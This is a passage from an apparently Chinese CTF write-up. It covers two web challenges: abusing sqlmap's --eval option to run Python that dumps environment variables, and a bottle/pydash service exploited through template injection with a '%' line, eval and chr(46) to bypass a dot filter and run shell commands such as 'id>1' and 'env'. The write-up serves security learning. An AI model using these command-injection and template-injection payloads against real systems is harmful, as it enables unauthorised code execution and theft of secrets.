30)</span></span><br><span class="line">    <span class="attr">--retries</span>=<span class="string">RETRIES   Retries when the connection timeouts (default 3)</span></span><br><span class="line">    <span class="attr">--randomize</span>=<span class="string">RPARAM  Randomly change value for given parameter(s)</span></span><br><span class="line">    <span class="attr">--safe-url</span>=<span class="string">SAFEURL  URL address to visit frequently during testing</span></span><br><span class="line">    <span class="attr">--safe-post</span>=<span class="string">SAFE..  POST data to send to a safe URL</span></span><br><span class="line">    <span class="attr">--safe-req</span>=<span class="string">SAFER..  Load safe HTTP request from a file</span></span><br><span class="line">    <span class="attr">--safe-freq</span>=<span class="string">SAFE..  Regular requests between visits to a safe URL</span></span><br><span class="line">    <span class="attr">--skip-urlencode</span>    <span class="string">Skip URL encoding of payload data</span></span><br><span class="line">    <span class="attr">--csrf-token</span>=<span class="string">CSR..  Parameter used to hold anti-CSRF token</span></span><br><span class="line">    <span class="attr">--csrf-url</span>=<span class="string">CSRFURL  URL address to visit for extraction of anti-CSRF token</span></span><br><span class="line">    <span class="attr">--csrf-method</span>=<span class="string">CS..  HTTP method to use during anti-CSRF token page visit</span></span><br><span class="line">    <span class="attr">--csrf-retries</span>=<span class="string">C..  Retries for anti-CSRF token retrieval (default 0)</span></span><br><span class="line">    <span class="attr">--force-ssl</span>         <span class="string">Force usage of SSL/HTTPS</span></span><br><span class="line">    <span class="attr">--chunked</span>           <span class="string">Use HTTP chunked transfer encoded (POST) requests</span></span><br><span class="line">    <span class="attr">--hpp</span>               <span class="string">Use HTTP parameter pollution method</span></span><br><span class="line">    <span class="attr">--eval</span>=<span class="string">EVALCODE     Evaluate provided Python code before the request (e.g.</span></span><br><span class="line">                        <span class="attr">&quot;import</span> <span class="string">hashlib;id2=hashlib.md5(id).hexdigest()&quot;)</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Optimization</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">These</span> <span class="string">options can be used to optimize the performance of sqlmap</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">-o</span>                  <span class="string">Turn on all optimization switches</span></span><br><span class="line">    <span class="attr">--predict-output</span>    <span class="string">Predict common queries output</span></span><br><span class="line">    <span class="attr">--keep-alive</span>        <span class="string">Use persistent HTTP(s) connections</span></span><br><span class="line">    <span class="attr">--null-connection</span>   <span class="string">Retrieve page length without actual HTTP response body</span></span><br><span class="line">    <span class="attr">--threads</span>=<span class="string">THREADS   Max number of concurrent HTTP(s) requests (default 1)</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Injection</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">These</span> <span class="string">options can be used to specify which parameters to test for,</span></span><br><span class="line">    <span class="attr">provide</span> <span class="string">custom injection payloads and optional tampering scripts</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">-p</span> <span class="string">TESTPARAMETER    Testable parameter(s)</span></span><br><span class="line">    <span class="attr">--skip</span>=<span class="string">SKIP         Skip testing for given parameter(s)</span></span><br><span class="line">    <span class="attr">--skip-static</span>       <span class="string">Skip testing parameters that not appear to be dynamic</span></span><br><span class="line">    <span class="attr">--param-exclude</span>=<span class="string">..  Regexp to exclude parameters from testing (e.g. &quot;ses&quot;)</span></span><br><span class="line">    <span class="attr">--param-filter</span>=<span class="string">P..  Select testable parameter(s) by place (e.g. &quot;POST&quot;)</span></span><br><span class="line">    <span class="attr">--dbms</span>=<span class="string">DBMS         Force back-end DBMS to provided value</span></span><br><span class="line">    <span class="attr">--dbms-cred</span>=<span class="string">DBMS..  DBMS authentication credentials (user:password)</span></span><br><span class="line">    <span class="attr">--os</span>=<span class="string">OS             Force back-end DBMS operating system to provided value</span></span><br><span class="line">    <span class="attr">--invalid-bignum</span>    <span class="string">Use big numbers for invalidating values</span></span><br><span class="line">    <span class="attr">--invalid-logical</span>   <span class="string">Use logical operations for invalidating values</span></span><br><span class="line">    <span class="attr">--invalid-string</span>    <span class="string">Use random strings for invalidating values</span></span><br><span class="line">    <span class="attr">--no-cast</span>           <span class="string">Turn off payload casting mechanism</span></span><br><span class="line">    <span class="attr">--no-escape</span>         <span class="string">Turn off string escaping mechanism</span></span><br><span class="line">    <span class="attr">--prefix</span>=<span class="string">PREFIX     Injection payload prefix string</span></span><br><span class="line">    <span class="attr">--suffix</span>=<span class="string">SUFFIX     Injection payload suffix string</span></span><br><span class="line">    <span class="attr">--tamper</span>=<span class="string">TAMPER     Use given script(s) for tampering injection data</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Detection</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">These</span> <span class="string">options can be used to customize the detection phase</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">--level</span>=<span class="string">LEVEL       Level of tests to perform (1-5, default 1)</span></span><br><span class="line">    <span class="attr">--risk</span>=<span class="string">RISK         Risk of tests to perform (1-3, default 1)</span></span><br><span class="line">    <span class="attr">--string</span>=<span class="string">STRING     String to match when query is evaluated to True</span></span><br><span class="line">    <span class="attr">--not-string</span>=<span class="string">NOT..  String to match when query is evaluated to False</span></span><br><span class="line">    <span class="attr">--regexp</span>=<span class="string">REGEXP     Regexp to match when query is evaluated to True</span></span><br><span class="line">    <span class="attr">--code</span>=<span class="string">CODE         HTTP code to match when query is evaluated to True</span></span><br><span class="line">    <span class="attr">--smart</span>             <span class="string">Perform thorough tests only if positive heuristic(s)</span></span><br><span class="line">    <span class="attr">--text-only</span>         <span class="string">Compare pages based only on the textual content</span></span><br><span class="line">    <span class="attr">--titles</span>            <span class="string">Compare pages based only on their titles</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Techniques</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">These</span> <span class="string">options can be used to tweak testing of specific SQL injection</span></span><br><span class="line">    <span class="attr">techniques</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">--technique</span>=<span class="string">TECH..  SQL injection techniques to use (default &quot;BEUSTQ&quot;)</span></span><br><span class="line">    <span class="attr">--time-sec</span>=<span class="string">TIMESEC  Seconds to delay the DBMS response (default 5)</span></span><br><span class="line">    <span class="attr">--union-cols</span>=<span class="string">UCOLS  Range of columns to test for UNION query SQL injection</span></span><br><span class="line">    <span class="attr">--union-char</span>=<span class="string">UCHAR  Character to use for bruteforcing number of columns</span></span><br><span class="line">    <span class="attr">--union-from</span>=<span class="string">UFROM  Table to use in FROM part of UNION query SQL injection</span></span><br><span class="line">    <span class="attr">--dns-domain</span>=<span class="string">DNS..  Domain name used for DNS exfiltration attack</span></span><br><span class="line">    <span class="attr">--second-url</span>=<span class="string">SEC..  Resulting page URL searched for second-order response</span></span><br><span class="line">    <span class="attr">--second-req</span>=<span class="string">SEC..  Load second-order HTTP request from file</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Fingerprint</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">-f,</span> <span class="string">--fingerprint   Perform an extensive DBMS version fingerprint</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Enumeration</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">These</span> <span class="string">options can be used to enumerate the back-end database</span></span><br><span class="line">    <span class="attr">management</span> <span class="string">system information, structure and data contained in the</span></span><br><span class="line">    <span class="attr">tables</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">-a,</span> <span class="string">--all           Retrieve everything</span></span><br><span class="line">    <span class="attr">-b,</span> <span class="string">--banner        Retrieve DBMS banner</span></span><br><span class="line">    <span class="attr">--current-user</span>      <span class="string">Retrieve DBMS current user</span></span><br><span class="line">    <span class="attr">--current-db</span>        <span class="string">Retrieve DBMS current database</span></span><br><span class="line">    <span class="attr">--hostname</span>          <span class="string">Retrieve DBMS server hostname</span></span><br><span class="line">    <span class="attr">--is-dba</span>            <span class="string">Detect if the DBMS current user is DBA</span></span><br><span class="line">    <span class="attr">--users</span>             <span class="string">Enumerate DBMS users</span></span><br><span class="line">    <span class="attr">--passwords</span>         <span class="string">Enumerate DBMS users password hashes</span></span><br><span class="line">    <span class="attr">--privileges</span>        <span class="string">Enumerate DBMS users privileges</span></span><br><span class="line">    <span class="attr">--roles</span>             <span class="string">Enumerate DBMS users roles</span></span><br><span class="line">    <span class="attr">--dbs</span>               <span class="string">Enumerate DBMS databases</span></span><br><span class="line">    <span class="attr">--tables</span>            <span class="string">Enumerate DBMS database tables</span></span><br><span class="line">    <span class="attr">--columns</span>           <span class="string">Enumerate DBMS database table columns</span></span><br><span class="line">    <span class="attr">--schema</span>            <span class="string">Enumerate DBMS schema</span></span><br><span class="line">    <span class="attr">--count</span>             <span class="string">Retrieve number of entries for table(s)</span></span><br><span class="line">    <span class="attr">--dump</span>              <span class="string">Dump DBMS database table entries</span></span><br><span class="line">    <span class="attr">--dump-all</span>          <span class="string">Dump all DBMS databases tables entries</span></span><br><span class="line">    <span class="attr">--search</span>            <span class="string">Search column(s), table(s) and/or database name(s)</span></span><br><span class="line">    <span class="attr">--comments</span>          <span class="string">Check for DBMS comments during enumeration</span></span><br><span class="line">    <span class="attr">--statements</span>        <span class="string">Retrieve SQL statements being run on DBMS</span></span><br><span class="line">    <span class="attr">-D</span> <span class="string">DB               DBMS database to enumerate</span></span><br><span class="line">    <span class="attr">-T</span> <span class="string">TBL              DBMS database table(s) to enumerate</span></span><br><span class="line">    <span class="attr">-C</span> <span class="string">COL              DBMS database table column(s) to enumerate</span></span><br><span class="line">    <span class="attr">-X</span> <span class="string">EXCLUDE          DBMS database identifier(s) to not enumerate</span></span><br><span class="line">    <span class="attr">-U</span> <span class="string">USER             DBMS user to enumerate</span></span><br><span class="line">    <span class="attr">--exclude-sysdbs</span>    <span class="string">Exclude DBMS system databases when enumerating tables</span></span><br><span class="line">    <span class="attr">--pivot-column</span>=<span class="string">P..  Pivot column name</span></span><br><span class="line">    <span class="attr">--where</span>=<span class="string">DUMPWHERE   Use WHERE condition while table dumping</span></span><br><span class="line">    <span class="attr">--start</span>=<span class="string">LIMITSTART  First dump table entry to retrieve</span></span><br><span class="line">    <span class="attr">--stop</span>=<span class="string">LIMITSTOP    Last dump table entry to retrieve</span></span><br><span class="line">    <span class="attr">--first</span>=<span class="string">FIRSTCHAR   First query output word character to retrieve</span></span><br><span class="line">    <span class="attr">--last</span>=<span class="string">LASTCHAR     Last query output word character to retrieve</span></span><br><span class="line">    <span class="attr">--sql-query</span>=<span class="string">SQLQ..  SQL statement to be executed</span></span><br><span class="line">    <span class="attr">--sql-shell</span>         <span class="string">Prompt for an interactive SQL shell</span></span><br><span class="line">    <span class="attr">--sql-file</span>=<span class="string">SQLFILE  Execute SQL statements from given file(s)</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Brute</span> <span class="string">force:</span></span><br><span class="line">    <span class="attr">These</span> <span class="string">options can be used to run brute force checks</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">--common-tables</span>     <span class="string">Check existence of common tables</span></span><br><span class="line">    <span class="attr">--common-columns</span>    <span class="string">Check existence of common columns</span></span><br><span class="line">    <span class="attr">--common-files</span>      <span class="string">Check existence of common files</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">User-defined</span> <span class="string">function injection:</span></span><br><span class="line">    <span class="attr">These</span> <span class="string">options can be used to create custom user-defined functions</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">--udf-inject</span>        <span class="string">Inject custom user-defined functions</span></span><br><span class="line">    <span class="attr">--shared-lib</span>=<span class="string">SHLIB  Local path of the shared library</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">File</span> <span class="string">system access:</span></span><br><span class="line">    <span class="attr">These</span> <span class="string">options can be used to access the back-end database management</span></span><br><span class="line">    <span class="attr">system</span> <span class="string">underlying file system</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">--file-read</span>=<span class="string">FILE..  Read a file from the back-end DBMS file system</span></span><br><span class="line">    <span class="attr">--file-write</span>=<span class="string">FIL..  Write a local file on the back-end DBMS file system</span></span><br><span class="line">    <span class="attr">--file-dest</span>=<span class="string">FILE..  Back-end DBMS absolute filepath to write to</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Operating</span> <span class="string">system access:</span></span><br><span class="line">    <span class="attr">These</span> <span class="string">options can be used to access the back-end database management</span></span><br><span class="line">    <span class="attr">system</span> <span class="string">underlying operating system</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">--os-cmd</span>=<span class="string">OSCMD      Execute an operating system command</span></span><br><span class="line">    <span class="attr">--os-shell</span>          <span class="string">Prompt for an interactive operating system shell</span></span><br><span class="line">    <span class="attr">--os-pwn</span>            <span class="string">Prompt for an OOB shell, Meterpreter or VNC</span></span><br><span class="line">    <span class="attr">--os-smbrelay</span>       <span class="string">One click prompt for an OOB shell, Meterpreter or VNC</span></span><br><span class="line">    <span class="attr">--os-bof</span>            <span class="string">Stored procedure buffer overflow exploitation</span></span><br><span class="line">    <span class="attr">--priv-esc</span>          <span class="string">Database process user privilege escalation</span></span><br><span class="line">    <span class="attr">--msf-path</span>=<span class="string">MSFPATH  Local path where Metasploit Framework is installed</span></span><br><span class="line">    <span class="attr">--tmp-path</span>=<span class="string">TMPPATH  Remote absolute path of temporary files directory</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Windows</span> <span class="string">registry access:</span></span><br><span class="line">    <span class="attr">These</span> <span class="string">options can be used to access the back-end database management</span></span><br><span class="line">    <span class="attr">system</span> <span class="string">Windows registry</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">--reg-read</span>          <span class="string">Read a Windows registry key value</span></span><br><span class="line">    <span class="attr">--reg-add</span>           <span class="string">Write a Windows registry key value data</span></span><br><span class="line">    <span class="attr">--reg-del</span>           <span class="string">Delete a Windows registry key value</span></span><br><span class="line">    <span class="attr">--reg-key</span>=<span class="string">REGKEY    Windows registry key</span></span><br><span class="line">    <span class="attr">--reg-value</span>=<span class="string">REGVAL  Windows registry key value</span></span><br><span class="line">    <span class="attr">--reg-data</span>=<span class="string">REGDATA  Windows registry key value data</span></span><br><span class="line">    <span class="attr">--reg-type</span>=<span class="string">REGTYPE  Windows registry key value type</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">General</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">These</span> <span class="string">options can be used to set some general working parameters</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">-s</span> <span class="string">SESSIONFILE      Load session from a stored (.sqlite) file</span></span><br><span class="line">    <span class="attr">-t</span> <span class="string">TRAFFICFILE      Log all HTTP traffic into a textual file</span></span><br><span class="line">    <span class="attr">--answers</span>=<span class="string">ANSWERS   Set predefined answers (e.g. &quot;quit=N,follow=N&quot;)</span></span><br><span class="line">    <span class="attr">--base64</span>=<span class="string">BASE64P..  Parameter(s) containing Base64 encoded data</span></span><br><span class="line">    <span class="attr">--base64-safe</span>       <span class="string">Use URL and filename safe Base64 alphabet (RFC 4648)</span></span><br><span class="line">    <span class="attr">--batch</span>             <span class="string">Never ask for user input, use the default behavior</span></span><br><span class="line">    <span class="attr">--binary-fields</span>=<span class="string">..  Result fields having binary values (e.g. &quot;digest&quot;)</span></span><br><span class="line">    <span class="attr">--check-internet</span>    <span class="string">Check Internet connection before assessing the target</span></span><br><span class="line">    <span class="attr">--cleanup</span>           <span class="string">Clean up the DBMS from sqlmap specific UDF and tables</span></span><br><span class="line">    <span class="attr">--crawl</span>=<span class="string">CRAWLDEPTH  Crawl the website starting from the target URL</span></span><br><span class="line">    <span class="attr">--crawl-exclude</span>=<span class="string">..  Regexp to exclude pages from crawling (e.g. &quot;logout&quot;)</span></span><br><span class="line">    <span class="attr">--csv-del</span>=<span class="string">CSVDEL    Delimiting character used in CSV output (default &quot;,&quot;)</span></span><br><span class="line">    <span class="attr">--charset</span>=<span class="string">CHARSET   Blind SQL injection charset (e.g. &quot;0123456789abcdef&quot;)</span></span><br><span class="line">    <span class="attr">--dump-format</span>=<span class="string">DU..  Format of dumped data (CSV (default), HTML or SQLITE)</span></span><br><span class="line">    <span class="attr">--encoding</span>=<span class="string">ENCOD..  Character encoding used for data retrieval (e.g. GBK)</span></span><br><span class="line">    <span class="attr">--eta</span>               <span class="string">Display for each output the estimated time of arrival</span></span><br><span class="line">    <span class="attr">--flush-session</span>     <span class="string">Flush session files for current target</span></span><br><span class="line">    <span class="attr">--forms</span>             <span class="string">Parse and test forms on target URL</span></span><br><span class="line">    <span class="attr">--fresh-queries</span>     <span class="string">Ignore query results stored in session file</span></span><br><span class="line">    <span class="attr">--gpage</span>=<span class="string">GOOGLEPAGE  Use Google dork results from specified page number</span></span><br><span class="line">    <span class="attr">--har</span>=<span class="string">HARFILE       Log all HTTP traffic into a HAR file</span></span><br><span class="line">    <span class="attr">--hex</span>               <span class="string">Use hex conversion during data retrieval</span></span><br><span class="line">    <span class="attr">--output-dir</span>=<span class="string">OUT..  Custom output directory path</span></span><br><span class="line">    <span class="attr">--parse-errors</span>      <span class="string">Parse and display DBMS error messages from responses</span></span><br><span class="line">    <span class="attr">--preprocess</span>=<span class="string">PRE..  Use given script(s) for preprocessing (request)</span></span><br><span class="line">    <span class="attr">--postprocess</span>=<span class="string">PO..  Use given script(s) for postprocessing (response)</span></span><br><span class="line">    <span class="attr">--repair</span>            <span class="string">Redump entries having unknown character marker (?)</span></span><br><span class="line">    <span class="attr">--save</span>=<span class="string">SAVECONFIG   Save options to a configuration INI file</span></span><br><span class="line">    <span class="attr">--scope</span>=<span class="string">SCOPE       Regexp for filtering targets</span></span><br><span class="line">    <span class="attr">--skip-heuristics</span>   <span class="string">Skip heuristic detection of SQLi/XSS vulnerabilities</span></span><br><span class="line">    <span class="attr">--skip-waf</span>          <span class="string">Skip heuristic detection of WAF/IPS protection</span></span><br><span class="line">    <span class="attr">--table-prefix</span>=<span class="string">T..  Prefix used for temporary tables (default: &quot;sqlmap&quot;)</span></span><br><span class="line">    <span class="attr">--test-filter</span>=<span class="string">TE..  Select tests by payloads and/or titles (e.g. ROW)</span></span><br><span class="line">    <span class="attr">--test-skip</span>=<span class="string">TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)</span></span><br><span class="line">    <span class="attr">--web-root</span>=<span class="string">WEBROOT  Web server document root directory (e.g. &quot;/var/www&quot;)</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Miscellaneous</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">These</span> <span class="string">options do not fit into any other category</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">-z</span> <span class="string">MNEMONICS        Use short mnemonics (e.g. &quot;flu,bat,ban,tec=EU&quot;)</span></span><br><span class="line">    <span class="attr">--alert</span>=<span class="string">ALERT       Run host OS command(s) when SQL injection is found</span></span><br><span class="line">    <span class="attr">--beep</span>              <span class="string">Beep on question and/or when SQLi/XSS/FI is found</span></span><br><span class="line">    <span class="attr">--dependencies</span>      <span class="string">Check for missing (optional) sqlmap dependencies</span></span><br><span class="line">    <span class="attr">--disable-coloring</span>  <span class="string">Disable console output coloring</span></span><br><span class="line">    <span class="attr">--list-tampers</span>      <span class="string">Display list of available tamper scripts</span></span><br><span class="line">    <span class="attr">--offline</span>           <span class="string">Work in offline mode (only use session data)</span></span><br><span class="line">    <span class="attr">--purge</span>             <span class="string">Safely remove all content from sqlmap data directory</span></span><br><span class="line">    <span class="attr">--results-file</span>=<span class="string">R..  Location of CSV results file in multiple targets mode</span></span><br><span class="line">    <span class="attr">--shell</span>             <span class="string">Prompt for an interactive sqlmap shell</span></span><br><span class="line">    <span class="attr">--tmp-dir</span>=<span class="string">TMPDIR    Local directory for storing temporary files</span></span><br><span class="line">    <span class="attr">--unstable</span>          <span class="string">Adjust options for unstable connections</span></span><br><span class="line">    <span class="attr">--update</span>            <span class="string">Update sqlmap</span></span><br><span class="line">    <span class="attr">--wizard</span>            <span class="string">Simple wizard interface for beginner users</span></span><br></pre></td></tr></table></figure>
+<p>可以找到有个参数：</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">--eval</span>=<span class="string">EVALCODE     Evaluate provided Python code before the request (e.g.</span></span><br><span class="line">                        <span class="attr">&quot;import</span> <span class="string">hashlib;id2=hashlib.md5(id).hexdigest()&quot;)</span></span><br></pre></td></tr></table></figure>
+<p>能够直接执行python命令，因此获得flag（根据dockerfile发现flag没有被写入到任意一个文件里，因此flag在环境变量）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 --eval=print(__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read())</span><br></pre></td></tr></table></figure>
+<img src="/posts/32411/3.png" class title="awa">
+<h1><span id="ez_dash"> ez_dash</span></h1>
+<p>给出源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Hints: Flag在环境变量中</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__forbidden_path__=[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__call__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__defaults__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__kwdefaults__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__qualname__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__wrapped__&#x27;</span>,</span><br><span class="line">               <span class="string">&quot;Optional&quot;</span>,<span class="string">&quot;func&quot;</span>,<span class="string">&quot;render&quot;</span>,</span><br><span class="line">               ]</span><br><span class="line">__forbidden_name__=[</span><br><span class="line">    <span class="string">&quot;bottle&quot;</span></span><br><span class="line">]</span><br><span class="line">__forbidden_name__.extend(<span class="built_in">dir</span>(<span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setval</span>(<span class="params">name:<span class="built_in">str</span>, path:<span class="built_in">str</span>, value:<span class="built_in">str</span></span>)-&gt; <span class="type">Optional</span>[<span class="built_in">bool</span>]:</span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    obj=<span class="built_in">globals</span>()[name]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.post(<span class="params"><span class="string">&#x27;/setValue&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_value</span>():</span><br><span class="line">    name = bottle.request.query.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    path=bottle.request.json.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(path,<span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name)&gt;<span class="number">6</span> <span class="keyword">or</span> <span class="built_in">len</span>(path)&gt;<span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    value=bottle.request.json.get(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;yes&quot;</span> <span class="keyword">if</span> setval(name, path, value) <span class="keyword">else</span> <span class="string">&quot;no&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.get(<span class="params"><span class="string">&#x27;/render&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>():</span><br><span class="line">    path=bottle.request.query.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> path.find(<span class="string">&quot;&#123;&quot;</span>)&gt;=<span class="number">0</span> <span class="keyword">or</span> path.find(<span class="string">&quot;&#125;&quot;</span>)&gt;=<span class="number">0</span> <span class="keyword">or</span> path.find(<span class="string">&quot;.&quot;</span>)&gt;=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hacker&quot;</span></span><br><span class="line">    <span class="keyword">return</span> bottle.template(path)</span><br><span class="line">bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>
+<p>一个bottle的服务+pydash的原型链污染，然后可以通过render渲染模板，但是该题对<code>/render</code>的过滤设置得不严谨，bottle的<a target="_blank" rel="noopener" href="https://www.osgeo.cn/bottle/stpl.html">模板渲染</a>功能很强大，不仅能够接受<code>&#123;&#123;&#125;&#125;</code>，还能够接受<code>%</code>引入一行python代码：</p>
+<img src="/posts/32411/4.png" class title="awa">
+<p>因此直接往render路由打即可，原型payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">% <span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&gt;1&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>(因为render能够渲染文件，因此将文件写入再用render渲染即可)</p>
+<p>由于过滤了<code>.</code>，但是这里是用eval()函数，因此可以使用<code>chr</code>函数绕过：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?path=% <span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;)&quot;</span>+<span class="built_in">chr</span>(<span class="number">46</span>)+<span class="string">&quot;popen(&#x27;id&gt;1&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>注意发送的时候<code>+</code>要进行url编码，不然会以为是空格然后报错</p>
+<img src="/posts/32411/5.png" class title="awa">
+<img src="/posts/32411/6.png" class title="awa">
+<p>flag在环境变量里，因此直接使用env写入到2里再访问即可：</p>
